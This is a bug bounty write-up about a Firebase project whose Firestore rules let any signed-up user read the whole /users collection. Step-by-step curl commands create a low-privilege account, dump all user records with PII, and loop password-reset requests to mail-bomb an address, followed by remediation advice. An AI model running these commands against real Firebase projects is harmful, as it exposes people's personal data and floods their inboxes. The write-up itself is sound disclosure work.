---
title: Insecure Firestore Security Rules & PII Exposure
url: https://infosecwriteups.com/insecure-firestore-security-rules-pii-exposure-762763ac577f?source=rss----7b722bfd1b8d--bug_bounty
source: Bug Bounty in InfoSec Write-ups on Medium
date: 2026-09-08
fetch_date: 2026-09-09T06:54:46.307377
---

# Insecure Firestore Security Rules & PII Exposure

[Sitemap](/sitemap/sitemap.xml)

[Open in app](https://play.google.com/store/apps/details?id=com.medium.reader&referrer=utm_source%3DmobileNavBar&source=---top_nav_layout_nav-------------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Finfosecwriteups.com%2Finsecure-firestore-security-rules-pii-exposure-762763ac577f&source=post_page---top_nav_layout_nav-----------------------global_nav--------------------)

[Medium Logo](https://medium.com/?source=---top_nav_layout_nav-------------------------------------------)

Get app

[Write](https://medium.com/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2Fnew-story&source=---top_nav_layout_nav-----------------------new_post_topnav--------------------)

[Search](https://medium.com/search?source=---top_nav_layout_nav-------------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Finfosecwriteups.com%2Finsecure-firestore-security-rules-pii-exposure-762763ac577f&source=post_page---top_nav_layout_nav-----------------------global_nav--------------------)

![Unknown user](https://miro.medium.com/v2/resize:fill:64:64/1*dmbNkD5D-u45r44go_cf0g.png)

[## InfoSec Write-ups](https://infosecwriteups.com/?source=post_page---publication_nav-7b722bfd1b8d-762763ac577f-----------------------------------------)

·

1. [Description & Root Cause](/?source=post_page-----762763ac577f-----------------------------------------#ffac "Description & Root Cause")
2. [3. Steps to Reproduce](/?source=post_page-----762763ac577f-----------------------------------------#4dbb "3. Steps to Reproduce")
3. [Step 1: Obtain a Low-Privilege Authentication Token](/?source=post_page-----762763ac577f-----------------------------------------#9dc6 "Step 1: Obtain a Low-Privilege Authentication Token")
4. [Step 2: Dump the Entire /users Collection](/?source=post_page-----762763ac577f-----------------------------------------#5110 "Step 2: Dump the Entire /users Collection")
5. [Step 3: Password Reset Mail Bombing](/?source=post_page-----762763ac577f-----------------------------------------#8669 "Step 3: Password Reset Mail Bombing")
6. [4. Impact](/?source=post_page-----762763ac577f-----------------------------------------#ded1 "4. Impact")

[![InfoSec Write-ups](https://miro.medium.com/v2/resize:fill:76:76/1*SWJxYWGZzgmBP1D0Qg_3zQ.png)](https://infosecwriteups.com/?source=post_page---post_publication_sidebar-7b722bfd1b8d-762763ac577f-----------------------------------------)

A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: <https://weekly.infosecwriteups.com/>

[Noob6t5](https://medium.com/tag/noob6t5?source=post_page---header_tags--762763ac577f-----------------------------------------)

[Bughunting](https://medium.com/tag/bug-hunting?source=post_page---header_tags--762763ac577f-----------------------------------------)

[Bug Bounty](https://medium.com/tag/bug-bounty?source=post_page---header_tags--762763ac577f-----------------------------------------)

[Bug Bounty Writeup](https://medium.com/tag/bug-bounty-writeup?source=post_page---header_tags--762763ac577f-----------------------------------------)

# Insecure Firestore Security Rules & PII Exposure

[![Sangharsha Upadhyaya](https://miro.medium.com/v2/resize:fill:64:64/1*s2HfPH4JmIXleW_RddquOw.png)](https://noob6t5.medium.com/?source=post_page---byline--762763ac577f-----------------------------------------)

[Sangharsha Upadhyaya](https://noob6t5.medium.com/?source=post_page---byline--762763ac577f-----------------------------------------)

2 min read

·

Aug 22, 2026

--

[Listen](https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2Fplans%3Fdimension%3Dpost_audio_button%26postId%3D762763ac577f&operation=register&redirect=https%3A%2F%2Finfosecwriteups.com%2Finsecure-firestore-security-rules-pii-exposure-762763ac577f&source=---header_actions--762763ac577f---------------------post_audio_button--------------------)

Share

After poking with firebase R/W

* **Realtime Database (Unauthenticated):** `https://[REDACTED].firebaseio.com/.json` (Access Denied)
* **Storage Bucket (Unauthenticated):** `https://firebasestorage.googleapis.com/v0/b/[REDACTED].appspot.com/o` (Access Denied)
* **Firestore (Unauthenticated):** `https://firestore.googleapis.com/v1/projects/[REDACTED]/databases/(default)/documents` (Access Denied)
* **Auth Action / Callback URLs:** Testing against `https://[REDACTED].firebaseapp.com/__/auth/action?mode=verifyEmail...` resulted in errors/failed states.

I moved to cli and got hit for /user endpoint

## Description & Root Cause

* **Insecure Firestore Rules:** The **/users** collection lacks proper ownership verification (request.auth.uid == resource.id). Any user who creates a standard, low-privilege account can query the Firestore REST API to extract all registered user records, including sensitive PII.
* **Exposed Credentials / Endpoints:** The Firebase API key and project identifiers are exposed in client-side configuration URLs, enabling direct interaction with Firebase backend services.
* **Mail Bombing Vector:** The Identity Toolkit API (sendOobCode) lacks strict rate-limiting, allowing malicious actors to flood arbitrary email addresses with automated password reset notifications.

## 3. Steps to Reproduce

**At first i got that valid api from password reset link I got project ID/name from deep diving in js and fuzzing**

## Step 1: Obtain a Low-Privilege Authentication Token

Register a test user via the Firebase Auth REST API to obtain a valid JWT:

```
## Get Sangharsha Upadhyaya’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Subscribe

[x]

Remember me for faster sign in

curl -s -X POST 'https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=API_KEY_HERE' \ -H 'Content-Type: application/json' \ -d '{"email":"[email protected]","password":"TestPassword123!","returnSecureToken":true}'
```

Extract the idToken from the response JSON and save it:

```
export TOKEN="<token>"
```

## Step 2: Dump the Entire /users Collection

```
curl -s "https://firestore.googleapis.com/v1/projects/[REDACTED_PROJECT_ID]/databases/(default)/documents/users" \ -H "Authorization: Bearer $TOKEN"
```

**Result:** The server returns a JSON payload containing the complete database of user details, documents, Bio, every PII’s that is of high impact and that paves path for further attack vector’s.

## Step 3: Password Reset Mail Bombing

```
for i in {1..10}; do curl -s -X POST 'https://identitytoolkit.googleapis.com/v1/accounts:sendOobCode?key=API_KEY_HERE' \ -H 'Content-Type: application/json' \ -d '{"requestType": "PASSWORD_RESET", "email": "[email protected]", "clientType": "CLIENT_TYPE_WEB"}' echo "Request $i sent" sleep 0.5 done
```

## 4. Impact

![]()

* **Account Takeover / Phishing Risk:** Exposed user directory data facilitates targeted phishing campaigns and impersonation.
* **Mail Bombing:** Unthrottled password reset requests flood target inboxes, degrading service reliability and user trust.

1. **Enforce Firestore Security Rules:** Update rules in the Firebase Console to restrict read/write access so users can only access their own user documents: match /users/{userId} { allow read, write: if request.auth != null && request.auth.uid == userId; }
2. **Implement Rate Limiting:** Apply rate limits and CAPTCHA challenges to authentication and password reset endpoints (sendOobCode) via Firebase App Check or backend proxies to prevent abuse and mail bombing.

*Originally published at* [*https://noob6t5.hashnode.dev*](https://noob6t5.hashnode.dev/insecure-firestore-security-rules-pii-exposure) *on August 22, 2026.*

[Noob6t5](https://medium.com/tag/noob6t5?source=post_page---footer_tags--762763ac577f-...